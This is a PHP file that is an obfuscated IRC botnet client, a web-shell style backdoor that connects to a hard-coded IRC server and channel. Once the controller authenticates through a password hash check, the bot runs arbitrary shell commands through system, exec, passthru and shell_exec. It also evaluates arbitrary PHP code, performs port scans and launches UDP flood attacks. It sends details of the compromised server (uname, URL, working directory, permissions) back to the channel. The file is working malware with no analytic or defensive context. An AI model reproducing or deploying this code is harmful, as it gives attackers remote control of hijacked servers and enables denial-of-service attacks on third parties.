<?php set_time_limit(0); error_reporting(0);  class FfVFZBrRzNJjBNrzj {

 var $VJNbVRzVNRRNvJR = array("bBvBbNRbZzNzNbzv"=>"gangbang.angels-agency.nl",
                     "ZJJz"=>"25343",
                     "Bzzvj"=>"scary",
                     "njZjrn"=>"13",
                     "pLXtT"=>"#wWw#",
                     "BrR"=>"scan",
                     "jjZVjzrJV"=>"41aa15390e2efa34ac693c3bd7cb8e88",
                     "bZbBfvnvnv"=>".",
                     "JjnNJfRVZbf"=>"a87710e60dee7645081a8fc2fab74dbd");
                      var $zBVFNfvvNvbNbbnJfR = array(); 
 function uaeAuiiQY($llPd) 
 { 
    $this->zBVFNfvvNvbNbbnJfR[$llPd] = true; 
 } function IMUeIiUAyMaYQiMA() {
  $DLtpLd = '[abcdefghijklm)nopqrstuvwxyz_ABCDEFGHIJKLM(NOPQRSTUVWXYZ-0123456789]';	
  $hTTxtlL = strlen($DLtpLd);
  for($x=0;$x<$this->VJNbVRzVNRRNvJR['njZjrn'];$x++) {
	$Yiy .= $DLtpLd[rand(0,$hTTxtlL-1)];
  }
  $this->UImaAeu("NICK ".$Yiy."");
 }function uayMIiQIyyiIUY() 
 { 
    while(!feof($this->kSKwgwkss)) 
    { 
       $this->aiumy = trim(fgets($this->kSKwgwkss,512)); 
       $NnRJfBJzJBBFb = explode(" ",$this->aiumy); 
       if(substr($this->aiumy,0,6)=="PING :") 
       { 
          $this->UImaAeu("PONG :".substr($this->aiumy,6)); 
       } 
       if(isset($NnRJfBJzJBBFb[1]) && $NnRJfBJzJBBFb[1] =="004") 
       { 
          $this->UImaAeu("JOIN ".$this->VJNbVRzVNRRNvJR['pLXtT']." ".$this->VJNbVRzVNRRNvJR['BrR']."");
          $this->IeMQUy($this->VJNbVRzVNRRNvJR['pLXtT'],$this->VJNbVRzVNRRNvJR['BrR']);
          $this->QEeyYaIaIMaYyuquAeU();
       } 
       if(isset($NnRJfBJzJBBFb[1]) && $NnRJfBJzJBBFb[1]=="433") 
       { 
          $this->IMUeIiUAyMaYQiMA(); 
       }
       if($this->aiumy != $bfR_dXT) 
       { 
          $bNzRfNjnZzBfFR = array(); 
          $SGG = substr(strstr($this->aiumy," :"),2); 
          $wSOO = explode(" ",$SGG); 
          $OkOso = explode("!",$NnRJfBJzJBBFb[0]); 
          $GSSwwc = explode("@",$OkOso[1]); 
          $GSSwwc = $GSSwwc[1]; 
          $OkOso = substr($OkOso[0],1); 
          $GswSocc = $NnRJfBJzJBBFb[0]; 
          if($wSOO[0]==$this->OkOso) 
          { 
           for($x=0;$x<count($wSOO);$x++) 
              $bNzRfNjnZzBfFR[$x] = $wSOO[$x+1]; 
          } 
          else 
          { 
           for($x=0;$x<count($wSOO);$x++) 
              $bNzRfNjnZzBfFR[$x] = $wSOO[$x]; 
          } 
          if(count($NnRJfBJzJBBFb)>2) 
          { 
             switch($NnRJfBJzJBBFb[1]) 
             { 
                case "QUIT": 
                   if($this->aAQiAiUMAquY($GswSocc)) 
                   { 
                      $this->QQMYimqM($GswSocc); 
                   } 
                break; 
                case "PART": 
                   if($this->aAQiAiUMAquY($GswSocc)) 
                   { 
                      $this->QQMYimqM($GswSocc); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->aAQiAiUMAquY($GswSocc) && (md5($GSSwwc) == $this->VJNbVRzVNRRNvJR['JjnNJfRVZbf'] || $this->VJNbVRzVNRRNvJR['JjnNJfRVZbf'] == "*")) 
                   { 
                      if(substr($bNzRfNjnZzBfFR[0],0,1)==$this->VJNbVRzVNRRNvJR['bZbBfvnvnv']) 
                      { 
                         switch(substr($bNzRfNjnZzBfFR[0],1)) 
                         { 
                            case "user": 
                              if(md5($bNzRfNjnZzBfFR[1])==$this->VJNbVRzVNRRNvJR['jjZVjzrJV']) 
                              { 
                                 $this->uaeAuiiQY($GswSocc);
                              } 
                              else 
                              { 
                                 $this->iYEumYuIei($this->VJNbVRzVNRRNvJR['pLXtT'],"[\002Auth\002]: Fout password $OkOso idioot!!");
                              } 
                            break; 
                         } 
                      } 
                   }
                   elseif($this->aAQiAiUMAquY($GswSocc)) 
                   { 
                      if(substr($bNzRfNjnZzBfFR[0],0,1)==$this->VJNbVRzVNRRNvJR['bZbBfvnvnv']) 
                      { 
                         switch(substr($bNzRfNjnZzBfFR[0],1)) 
                         {                            case "die": 
                               $this->UImaAeu("QUIT :die command from $OkOso");
                               fclose($this->kSKwgwkss); 
                               exit;                            case "raw":
                               $this->UImaAeu(strstr($SGG,$bNzRfNjnZzBfFR[1])); 
                            break;                            case "restart": 
                               $this->UImaAeu("QUIT :gerestart door $OkOso");
                               fclose($this->kSKwgwkss); 
                               $this->uqMUmUAYaImiE(); 
                            break;                            case "system": 
                               $cCOswkwGGwWs = substr(strstr($SGG,$bNzRfNjnZzBfFR[0]),strlen($bNzRfNjnZzBfFR[0])+1); 
                               $cwOKoOWWgogCC = system($cCOswkwGGwWs); 
                               $ggCscsWGgScsSg = explode("\n",$cwOKoOWWgogCC); 
                               for($x=0;$x<count($ggCscsWGgScsSg);$x++) 
                                  if($ggCscsWGgScsSg[$x]!=NULL) 
                                     $this->iIQeYeUUqeM($this->VJNbVRzVNRRNvJR['pLXtT'],"      : ".trim($ggCscsWGgScsSg[$x])); 
                            break;                            case "logout": 
                               $this->QQMYimqM($GswSocc); 
                               $this->iIQeYeUUqeM($this->VJNbVRzVNRRNvJR['pLXtT'],"[\002Auth\002]\00314 Je bent nu uitgelogt $OkOso"); 
                            break;                            case "exec": 
                               $cCOswkwGGwWs = substr(strstr($SGG,$bNzRfNjnZzBfFR[0]),strlen($bNzRfNjnZzBfFR[0])+1); 
                               $cwOKoOWWgogCC = exec($cCOswkwGGwWs); 
                               $ggCscsWGgScsSg = explode("\n",$cwOKoOWWgogCC); 
                               for($x=0;$x<count($ggCscsWGgScsSg);$x++) 
                                  if($ggCscsWGgScsSg[$x]!=NULL) 
                                     $this->iIQeYeUUqeM($this->VJNbVRzVNRRNvJR['pLXtT'],"      : ".trim($ggCscsWGgScsSg[$x])); 
                            break;                            case "pscan": 
                               if(count($bNzRfNjnZzBfFR) > 2) 
                               { 
                                  if(fsockopen($bNzRfNjnZzBfFR[1],$bNzRfNjnZzBfFR[2],$e,$s,15)) 
                                     $this->iIQeYeUUqeM($this->VJNbVRzVNRRNvJR['pLXtT'],"[\002pscan\002]: ".$bNzRfNjnZzBfFR[1].":".$bNzRfNjnZzBfFR[2]." is \2open\2"); 
                                  else 
                                     $this->iIQeYeUUqeM($this->VJNbVRzVNRRNvJR['pLXtT'],"[\002pscan\002]: ".$bNzRfNjnZzBfFR[1].":".$bNzRfNjnZzBfFR[2]." is \2closed\2"); 
                               } 
                            break;                            case "passthru": 
                               $cCOswkwGGwWs = substr(strstr($SGG,$bNzRfNjnZzBfFR[0]),strlen($bNzRfNjnZzBfFR[0])+1); 

                               $cwOKoOWWgogCC = passthru($cCOswkwGGwWs); 
                               $ggCscsWGgScsSg = explode("\n",$cwOKoOWWgogCC); 
                               for($x=0;$x<count($ggCscsWGgScsSg);$x++) 
                                  if($ggCscsWGgScsSg[$x]!=NULL) 
                                     $this->iIQeYeUUqeM($this->VJNbVRzVNRRNvJR['pLXtT'],"      : ".trim($ggCscsWGgScsSg[$x])); 
                            break;                            case "info":
                               $this->QEeyYaIaIMaYyuquAeU();
                            break;                            case "sexec":
                               $cCOswkwGGwWs = substr(strstr($SGG,$bNzRfNjnZzBfFR[0]),strlen($bNzRfNjnZzBfFR[0])+1); 
                               $cwOKoOWWgogCC = shell_exec($cCOswkwGGwWs); 
                               $ggCscsWGgScsSg = explode("\n",$cwOKoOWWgogCC); 
                               for($x=0;$x<count($ggCscsWGgScsSg);$x++) 
                                  if($ggCscsWGgScsSg[$x]!=NULL) 
                                     $this->iIQeYeUUqeM($this->VJNbVRzVNRRNvJR['pLXtT'],"      : ".trim($ggCscsWGgScsSg[$x])); 
                            break;                            case "eval":
                              $eval = eval(substr(strstr($SGG,$bNzRfNjnZzBfFR[1]),strlen($bNzRfNjnZzBfFR[1])));
                            break;                            case "rndnick": 
                               $this->IMUeIiUAyMaYQiMA(); 
                            break;                            case "udpflood": 
                               if(count($bNzRfNjnZzBfFR)>3) 
                               { 
                                  $this->UuuEmYaAyAqIMqYuUi($bNzRfNjnZzBfFR[1],$bNzRfNjnZzBfFR[2],$bNzRfNjnZzBfFR[3]); 
                               } 
                            break;                            case "dns": 
                               if(isset($bNzRfNjnZzBfFR[1])) 
                               { 
                                  $CS = explode(".",$bNzRfNjnZzBfFR[1]); 
                                  if(count($CS)==4 && is_numeric($CS[0]) && is_numeric($CS[1]) && is_numeric($CS[2]) && is_numeric($CS[3])) 
                                  { 
                                     $this->iIQeYeUUqeM($this->VJNbVRzVNRRNvJR['pLXtT'],"[\002dns\002]: ".$bNzRfNjnZzBfFR[1]." => ".gethostbyaddr($bNzRfNjnZzBfFR[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->iIQeYeUUqeM($this->VJNbVRzVNRRNvJR['pLXtT'],"[\002dns\002]: ".$bNzRfNjnZzBfFR[1]." => ".gethostbyname($bNzRfNjnZzBfFR[1])); 
                                  } 
                               } 
                            break;                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $bfR_dXT = $this->aiumy; 
    } 
    $this->uqMUmUAYaImiE(); 
 } function QEeyYaIaIMaYyuquAeU() {
	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $hTPXTDDpdXp = "\0034ON\003"; } else { $hTPXTDDpdXp = "\0039OFF\003"; }

	$tldPPTxD = php_uname();
	if($tldPPTxD == "") { $RngkhH = "\00315---\003"; } else { $RngkhH = "\00315".$tldPPTxD."\003"; }
		 
	 $BVcK = "\00315http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\003";
	 
	 $TLOCs =  getcwd()."";
	 
	 $HCwW = "\00315".$TLOCs."\003";

	$GssGKcsWCS = fileperms("$TLOCs");

	if (($GssGKcsWCS & 0xC000) == 0xC000) { $GoCgogoocsk = 's';
	} elseif (($GssGKcsWCS & 0xA000) == 0xA000) { $GoCgogoocsk = 'l';
	} elseif (($GssGKcsWCS & 0x8000) == 0x8000) { $GoCgogoocsk = '-';
	} elseif (($GssGKcsWCS & 0x6000) == 0x6000) { $GoCgogoocsk = 'b';
	} elseif (($GssGKcsWCS & 0x4000) == 0x4000) { $GoCgogoocsk = 'd';
	} elseif (($GssGKcsWCS & 0x2000) == 0x2000) { $GoCgogoocsk = 'c';
	} elseif (($GssGKcsWCS & 0x1000) == 0x1000) { $GoCgogoocsk = 'p';
	} else { $GoCgogoocsk = 'u'; }

	$GoCgogoocsk .= (($GssGKcsWCS & 0x0100) ? 'r' : '-');
	$GoCgogoocsk .= (($GssGKcsWCS & 0x0080) ? 'w' : '-');
	$GoCgogoocsk .= (($GssGKcsWCS & 0x0040) ?	(($GssGKcsWCS & 0x0800) ? 's' : 'x' ) :	(($GssGKcsWCS & 0x0800) ? 'S' : '-'));

	$GoCgogoocsk .= (($GssGKcsWCS & 0x0020) ? 'r' : '-');
	$GoCgogoocsk .= (($GssGKcsWCS & 0x0010) ? 'w' : '-');
	$GoCgogoocsk .= (($GssGKcsWCS & 0x0008) ?	(($GssGKcsWCS & 0x0400) ? 's' : 'x' ) :	(($GssGKcsWCS & 0x0400) ? 'S' : '-'));

	$GoCgogoocsk .= (($GssGKcsWCS & 0x0004) ? 'r' : '-');
	$GoCgogoocsk .= (($GssGKcsWCS & 0x0002) ? 'w' : '-');
	$GoCgogoocsk .= (($GssGKcsWCS & 0x0001) ?	(($GssGKcsWCS & 0x0200) ? 't' : 'x' ) :	(($GssGKcsWCS & 0x0200) ? 'T' : '-'));
			
	$zfpP = "\00315".$GoCgogoocsk."\003";

	$this->iIQeYeUUqeM($this->VJNbVRzVNRRNvJR['pLXtT'],"\00314[SAFE:\003\002 $hTPXTDDpdXp\002\00314]\00315 $BVcK \00314[pwd:]\00315 $HCwW \00314(\003$zfpP\00314) [uname:]\00315 $RngkhH");
 } function QQMYimqM($llPd) 
 { 
    unset($this->zBVFNfvvNvbNbbnJfR[$llPd]); 
 } function uqMUmUAYaImiE() 
 { 
    if(!($this->kSKwgwkss = fsockopen($this->VJNbVRzVNRRNvJR['bBvBbNRbZzNzNbzv'],$this->VJNbVRzVNRRNvJR['ZJJz'],$e,$s,30))) 
    $this->uqMUmUAYaImiE(); 
    $this->mIaMuiYiUuiEEaAmm();
    if(strlen($this->VJNbVRzVNRRNvJR['Bzzvj'])>0) 
    $this->UImaAeu("PASS ".$this->VJNbVRzVNRRNvJR['Bzzvj']);
    $this->IMUeIiUAyMaYQiMA();
    $this->uayMIiQIyyiIUY();
 } function UImaAeu($xtT) 
 { 
    fwrite($this->kSKwgwkss,"$xtT\r\n"); 
 } function UuuEmYaAyAqIMqYuUi($llPd,$txlppXTxPl,$eEii) {
	$this->iIQeYeUUqeM($this->VJNbVRzVNRRNvJR['pLXtT'],"[\002UdpFlood Gestart!\002]"); 
	$HDpPxlHxd = "";
	for($x=0;$x<$txlppXTxPl;$x++) { $HDpPxlHxd .= chr(mt_rand(1,256)); }
	$Txdpx = time();
	$x = 0;
	while(time()-$Txdpx < $eEii) {
		$BP=fsockopen("udp://".$llPd,mt_rand(0,6000),$e,$s,5);
      	fwrite($BP,$HDpPxlHxd);
       	fclose($BP);
		$x++;
	}
	$fot = $x * $txlppXTxPl;
	$fot = $fot / 1048576;
	$TZC = $fot / $eEii;
	$TZC = round($TZC);
	$fot = round($fot);
	$this->iIQeYeUUqeM($this->VJNbVRzVNRRNvJR['pLXtT'],"[\002UdpFlood Afgerond!\002]: $fot MB verzonden / gemiddelde: $TZC MB/s ");
 } function iIQeYeUUqeM($dP,$xtT)
 {
    $this->UImaAeu("PRIVMSG $dP :$xtT");
 } function iYEumYuIei($dP,$xtT)
 {
    $this->UImaAeu("NOTICE $dP :$xtT");
 } function aAQiAiUMAquY($llPd) 
 { 
    if(isset($this->zBVFNfvvNvbNbbnJfR[$llPd])) 
       return 1; 
    else 
       return 0; 
 } function mIaMuiYiUuiEEaAmm() {
  $DLtpLd = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';	
  $hTTxtlL = strlen($DLtpLd);
  for($x=0;$x<6;$x++) {
	$Yiy .= $DLtpLd[rand(0,$hTTxtlL-1)];
  }
  if(php_uname() == "") { $tldPPTxD = "---"; } else { $tldPPTxD = php_uname(); }
  $this->UImaAeu("USER ".$Yiy."-go 127.0.0.1 localhost :".$tldPPTxD."");
 } function IeMQUy($pLXtT,$BrR=NULL) 
 { 
    $this->UImaAeu("JOIN $pLXtT $BrR"); 
 }}
$SgoCOGsS = new FfVFZBrRzNJjBNrzj;
$SgoCOGsS->uqMUmUAYaImiE(); ?>